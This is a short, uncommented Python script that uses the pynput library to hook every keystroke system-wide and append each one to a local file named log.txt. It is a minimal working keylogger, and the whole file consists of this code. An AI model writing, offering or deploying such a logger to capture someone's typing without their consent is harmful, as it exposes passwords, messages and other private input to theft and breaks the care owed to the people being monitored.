from pynput.keyboard import Listener

def log(key):
    key = str(key)
    with open("log.txt", "a") as f:
        f.write(key + "\n")

with Listener(on_press=log) as l:
    l.join()
